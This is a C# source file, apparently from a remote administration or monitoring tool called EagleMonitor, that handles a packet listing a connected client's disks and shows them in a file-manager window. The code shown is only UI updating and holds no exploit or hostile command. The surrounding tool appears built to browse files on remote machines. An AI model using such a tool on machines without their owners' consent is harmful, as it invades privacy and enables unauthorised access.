using EagleMonitor.Networking;
using PacketLib.Packet;
using System.Threading;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class DisksPacketHandler
    {
        public DisksPacketHandler(DiskPacket diskPacket, ClientHandler clientHandler) 
        {
            /*clientHandler.fileManagerForm.Invoke((MethodInvoker)(() =>
            {
                clientHandler.fileManagerForm.diskComboBox.Items.Clear();
                clientHandler.fileManagerForm.fileListView.Items.Clear();
                //TODO : Clear combobox
                foreach (string disk in diskPacket.disksList)
                {
                    //TODO : Add disk in combobox
                    //MessageBox.Show(disk);
                    clientHandler.fileManagerForm.diskComboBox.Items.Add(disk);
                }
                //Client.ClientDictionary[Data.IP_Origin].fileManagerForm.disksComboBox.SelectedItem = Client.ClientDictionary[Data.IP_Origin].fileManagerForm.disksComboBox.Items[0];
                clientHandler.fileManagerForm.diskComboBox.SelectedItem = clientHandler.fileManagerForm.diskComboBox.Items[0];
            }));*/
            new Thread(() =>
            {
                try
                {
                    clientHandler.fileManagerForm.BeginInvoke((MethodInvoker)(() =>
                    {
                        clientHandler.fileManagerForm.loadingCircle1.Visible = false;
                        clientHandler.fileManagerForm.loadingCircle1.Active = false;
                        clientHandler.fileManagerForm.diskComboBox.Items.Clear();
                        clientHandler.fileManagerForm.fileListView.Items.Clear();
                        //TODO : Clear combobox
                        foreach (string disk in diskPacket.disksList)
                        {
                            //TODO : Add disk in combobox
                            //MessageBox.Show(disk);
                            clientHandler.fileManagerForm.diskComboBox.Items.Add(disk);
                        }
                        //Client.ClientDictionary[Data.IP_Origin].fileManagerForm.disksComboBox.SelectedItem = Client.ClientDictionary[Data.IP_Origin].fileManagerForm.disksComboBox.Items[0];
                        clientHandler.fileManagerForm.diskComboBox.SelectedItem = clientHandler.fileManagerForm.diskComboBox.Items[0];

                        diskPacket = null;
                    }));
                    return;
                }
                catch { }
            }).Start();
        }
    }
}
